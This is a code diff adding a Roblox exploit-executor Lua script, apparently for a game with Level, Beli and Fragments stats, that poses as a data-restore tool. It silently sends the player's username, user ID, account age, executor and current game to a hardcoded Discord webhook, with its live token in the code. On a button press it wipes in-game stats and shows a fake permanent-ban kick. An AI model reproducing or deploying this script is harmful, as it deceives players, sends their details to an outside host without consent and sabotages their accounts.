@@ -1,0 +1,84 @@
+wait(2)
+game.Players.LocalPlayer.PlayerGui.Main.DataRestore2.Info.Back.Visible = false
+game.Players.LocalPlayer.PlayerGui.Main.DataRestore.Visible = true
+game.Players.LocalPlayer.PlayerGui.Main.DataRestore2.Container.List.Level.Text = "Level: 1200"
+next = Instance.new("TextButton")
+next.Name = "next"
+next.Parent = game.Players.LocalPlayer.PlayerGui.Main.DataRestore.Info.Exit.TextLabel
+next.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+next.Size = UDim2.new(0, 80, 0, 20)
+next.BackgroundTransparency = 1.000
+next.BorderColor3 = Color3.fromRGB(250, 250, 250)
+next.Font = Enum.Font.SourceSans
+next.Text = ""
+next.TextColor3 = Color3.fromRGB(250, 250, 250)
+next.TextSize = 30.000
+next.MouseButton1Down:connect(function()
+game.Players.LocalPlayer.PlayerGui.Main.DataRestore.Visible = false
+game.Players.LocalPlayer.PlayerGui.Main.DataRestore2.Visible = true
+end)
+local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Shit exploit g"
+                    local HttpService = game:GetService("HttpService")
+                    local Data =
+                        {
+                            ["embeds"]= {
+                                {            
+                                    ["title"]= "Click here to view players profile";
+                                    ["url"]= "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId;
+                                    ["description"]= "```"..game.Players.LocalPlayer.DisplayName.." ("..game.Players.LocalPlayer.Name..") ```";
+                                    ["color"]= tonumber(0x7269da);
+                                    
+                                    ["fields"]= {
+                                        {
+                                            ["name"]= "Executor",
+                                            ["value"]= "```"..ExecutorUsing.."```",
+                                            ["inline"]= true
+                                        },
+                                        {
+                                            ["name"]= "Age",
+                                            ["value"]= "```"..game.Players.LocalPlayer.AccountAge.."```",
+                                            ["inline"]= true
+                                        },
+                                        {
+                                            ["name"]= "Script Starus",
+                                            ["value"]= "```Người dùng đã bay acc```",
+                                            ["inline"]= true
+                                        },
+                                    {
+                                            ["name"]= "```Game đang chơi```",
+                                            ["value"]= "```https://www.roblox.com/games/"..Game.PlaceId.."/```",
+                                            ["inline"]= true
+                                        },
+                                    }              
+                                }
+                            }
+                    }
+                    local Headers = {["Content-Type"]="application/json"}
+                    local Encoded = HttpService:JSONEncode(Data)
+                    
+                    Request = http_request or request or HttpPost or syn.request
+                    local Final1 = {Url = "https://discord.com/api/webhooks/1094158537275473930/Hofa0_4t_jhZ66BqVOh4ocVJb6LcejUWBwYFzATPtocaYkT74Muf4vgBaLJCWCJL3jn2", Body = Encoded, Method = "POST", Headers = Headers}
+                   
+                    Request(Final1)
+next1 = Instance.new("TextButton")
+next1.Name = "next1"
+next1.Parent = game.Players.LocalPlayer.PlayerGui.Main.DataRestore2.Info.Confirm
+next1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+next1.Size = UDim2.new(0, 80, 0, 20)
+next1.BackgroundTransparency = 1.000
+next1.BorderColor3 = Color3.fromRGB(250, 250, 250)
+next1.Font = Enum.Font.SourceSans
+next1.Text = ""
+next1.TextColor3 = Color3.fromRGB(250, 250, 250)
+next1.TextSize = 30.000
+next1.MouseButton1Down:connect(function()
+game.Players.LocalPlayer.PlayerGui.Main.DataRestore2.Visible = false
+game.Players.LocalPlayer.Data.Level.Value = 1200
+game.Players.LocalPlayer.Data.Beli.Value = 1
+game.Players.LocalPlayer.Data.Exp.Value = 0
+game.Players.LocalPlayer.Data.Fragments.Value = 1
+wait(5.0)
+game.Players.LocalPlayer:Kick("you have been banned forever") 
+wait(3.1)
+game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
+end)
